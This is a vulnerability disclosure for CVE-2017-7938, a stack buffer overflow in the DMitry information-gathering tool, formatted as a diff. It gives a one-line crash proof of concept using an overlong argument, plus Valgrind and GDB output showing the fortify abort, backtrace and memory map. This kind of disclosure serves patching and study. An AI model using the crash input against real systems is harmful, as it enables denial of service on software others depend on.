@@ -1,0 +1,107 @@
+ ################
+#Exploit Title: Dmitry(Deepmagic Information Gathering Tool) Local Stack Buffer Overflow
+#CVE: CVE-2017-7938
+#CWE: CWE-119
+#Exploit Author: Hosein Askari (FarazPajohan)
+#Vendor HomePage: http://mor-pah.net/software/dmitry-deepmagic-information-gathering-tool/
+#Version : 1.3a (Unix)
+#Exploit Tested on: Parrot OS
+#Date: 19-04-2017
+#Category: Application
+#Author Mail : hosein.askari@aol.com
+#Description: Buffer overflow in DMitry (Deepmagic Information Gathering Tool) version 1.3a (Unix) allows attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a long argument. An example threat model is automated execution of DMitry with hostname strings found in local log files.
+###############################
+#valgrind dmitry $(python -c 'print "A"*64')
+==11312== Memcheck, a memory error detector
+==11312== Copyright (C) 2002-2015, and GNU GPL'd, by Julian Seward et al.
+==11312== Using Valgrind-3.12.0 and LibVEX; rerun with -h for copyright info
+==11312== Command: dmitry AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+==11312== 
+Deepmagic Information Gathering Tool
+"There be some deep magic going on"
+
+ERROR: Unable to locate Host IP addr. for AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Continuing with limited modules
+HostIP:
+HostName:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Gathered Inic-whois information for AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+---------------------------------
+Error: Unable to connect - Invalid Host
+ERROR: Connection to InicWhois Server AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA failed
+
+Gathered Netcraft information for AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+---------------------------------
+
+Retrieving Netcraft.com information for AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Netcraft.com Information gathered
+**11312** *** strcpy_chk: buffer overflow detected ***: program terminated
+==11312==    at 0x4030DD7: VALGRIND_PRINTF_BACKTRACE (valgrind.h:6818)
+==11312==    by 0x40353AA: __strcpy_chk (vg_replace_strmem.c:1439)
+==11312==    by 0x804B5F7: ??? (in /usr/bin/dmitry)
+==11312==    by 0x8048ED8: ??? (in /usr/bin/dmitry)
+==11312==    by 0x407D275: (below main) (libc-start.c:291)
+==11312== 
+==11312== HEAP SUMMARY:
+==11312==     in use at exit: 0 bytes in 0 blocks
+==11312==   total heap usage: 82 allocs, 82 frees, 238,896 bytes allocated
+==11312== 
+==11312== All heap blocks were freed -- no leaks are possible
+==11312== 
+==11312== For counts of detected and suppressed errors, rerun with: -v
+==11312== ERROR SUMMARY: 0 errors from 0 contexts (suppressed: 0 from 0)
+======================================
+GDB output:
+(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Starting program: /usr/bin/dmitry AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Deepmagic Information Gathering Tool
+"There be some deep magic going on"
+
+ERROR: Unable to locate Host IP addr. for AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Continuing with limited modules
+*** buffer overflow detected ***: /usr/bin/dmitry terminated
+======= Backtrace: =========
+/lib/i386-linux-gnu/libc.so.6(+0x6737a)[0xb7e5a37a]
+/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x37)[0xb7eeae17]
+/lib/i386-linux-gnu/libc.so.6(+0xf60b8)[0xb7ee90b8]
+/lib/i386-linux-gnu/libc.so.6(+0xf56af)[0xb7ee86af]
+/usr/bin/dmitry[0x8048e04]
+/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf6)[0xb7e0b276]
+/usr/bin/dmitry[0x80490a4]
+======= Memory map: ========
+08048000-0804f000 r-xp 00000000 08:01 7209647    /usr/bin/dmitry
+0804f000-08050000 r--p 00006000 08:01 7209647    /usr/bin/dmitry
+08050000-08051000 rw-p 00007000 08:01 7209647    /usr/bin/dmitry
+08051000-08073000 rw-p 00000000 00:00 0          [heap]
+b7d9f000-b7dbb000 r-xp 00000000 08:01 24248323   /lib/i386-linux-gnu/libgcc_s.so.1
+b7dbb000-b7dbc000 r--p 0001b000 08:01 24248323   /lib/i386-linux-gnu/libgcc_s.so.1
+b7dbc000-b7dbd000 rw-p 0001c000 08:01 24248323   /lib/i386-linux-gnu/libgcc_s.so.1
+b7dbd000-b7dd1000 r-xp 00000000 08:01 24249970   /lib/i386-linux-gnu/libresolv-2.24.so
+b7dd1000-b7dd2000 r--p 00013000 08:01 24249970   /lib/i386-linux-gnu/libresolv-2.24.so
+b7dd2000-b7dd3000 rw-p 00014000 08:01 24249970   /lib/i386-linux-gnu/libresolv-2.24.so
+b7dd3000-b7dd5000 rw-p 00000000 00:00 0 
+b7dd5000-b7dda000 r-xp 00000000 08:01 24249963   /lib/i386-linux-gnu/libnss_dns-2.24.so
+b7dda000-b7ddb000 r--p 00004000 08:01 24249963   /lib/i386-linux-gnu/libnss_dns-2.24.so
+b7ddb000-b7ddc000 rw-p 00005000 08:01 24249963   /lib/i386-linux-gnu/libnss_dns-2.24.so
+b7ddc000-b7dde000 r-xp 00000000 08:01 24249725   /lib/i386-linux-gnu/libnss_mdns4_minimal.so.2
+b7dde000-b7ddf000 r--p 00001000 08:01 24249725   /lib/i386-linux-gnu/libnss_mdns4_minimal.so.2
+b7ddf000-b7de0000 rw-p 00002000 08:01 24249725   /lib/i386-linux-gnu/libnss_mdns4_minimal.so.2
+b7de0000-b7deb000 r-xp 00000000 08:01 24249964   /lib/i386-linux-gnu/libnss_files-2.24.so
+b7deb000-b7dec000 r--p 0000a000 08:01 24249964   /lib/i386-linux-gnu/libnss_files-2.24.so
+b7dec000-b7ded000 rw-p 0000b000 08:01 24249964   /lib/i386-linux-gnu/libnss_files-2.24.so
+b7ded000-b7df3000 rw-p 00000000 00:00 0 
+b7df3000-b7fa4000 r-xp 00000000 08:01 24249955   /lib/i386-linux-gnu/libc-2.24.so
+b7fa4000-b7fa6000 r--p 001b0000 08:01 24249955   /lib/i386-linux-gnu/libc-2.24.so
+b7fa6000-b7fa7000 rw-p 001b2000 08:01 24249955   /lib/i386-linux-gnu/libc-2.24.so
+b7fa7000-b7faa000 rw-p 00000000 00:00 0 
+b7fd4000-b7fd7000 rw-p 00000000 00:00 0 
+b7fd7000-b7fd9000 r--p 00000000 00:00 0          [vvar]
+b7fd9000-b7fdb000 r-xp 00000000 00:00 0          [vdso]
+b7fdb000-b7ffd000 r-xp 00000000 08:01 24249741   /lib/i386-linux-gnu/ld-2.24.so
+b7ffd000-b7ffe000 rw-p 00000000 00:00 0 
+b7ffe000-b7fff000 r--p 00022000 08:01 24249741   /lib/i386-linux-gnu/ld-2.24.so
+b7fff000-b8000000 rw-p 00023000 08:01 24249741   /lib/i386-linux-gnu/ld-2.24.so
+bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
+
+Program received signal SIGABRT, Aborted.
+0xb7fd9cf9 in __kernel_vsyscall ()
